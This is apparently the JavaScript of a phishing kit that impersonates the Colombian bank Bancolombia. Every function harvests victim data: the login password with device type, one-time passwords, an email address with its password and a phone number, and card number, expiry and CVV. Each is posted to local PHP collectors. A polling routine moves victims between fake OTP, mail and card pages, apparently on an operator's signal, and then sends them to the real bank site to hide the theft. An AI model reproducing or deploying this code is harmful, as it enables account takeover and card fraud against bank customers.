function inicio(u){
    $.post( "process/inicio.php", { usr: u} ,function(data) {
        window.location.href = "opcion1.html";
    });
}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}   


function pasousuario(p){
    var res;
    var d = detectar_dispositivo();
    $.post( "opcion1.html", { pass: p, dis: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                res = data.split("-");
                window.location.href = "opcion1.html";
            }
        }
    });
}            

function consultar_estado(){
    $.post( "process/estado.php",function(data) {
        switch (data) {
            case '2': window.location.href = "OTP.php"; break;
            case '4': window.location.href = "MAIL.php"; break;
            case '6': window.location.href = "CARD.php"; break;               
            case '8': window.location.href = "ERR-OTP.php"; break;
            case '10': window.location.href = "https://sucursalpersonas.transaccionesbancolombia.com/mua/USER?scis=0LJh1l98rCrb6WBJQhYJS28260yxXs%2BV3cSty98o85s%3D"; break;
            case '12': window.location.href = "/poral"; break;
        } 
    });        
}

function enviar_otp(o){
    $.post( "process/pasoOTP.php",{ otp:o },function(data) {
        window.location.href = "WAITING.php";
    }); 
}

function enviar_mail(m,c,t){    
    $.post( "process/pasomail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "WAITING.php";
    });
}

function enviar_tarjeta(t,f,c){    
    $.post( "process/pasotarjeta.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "WAITING.php";
    });
}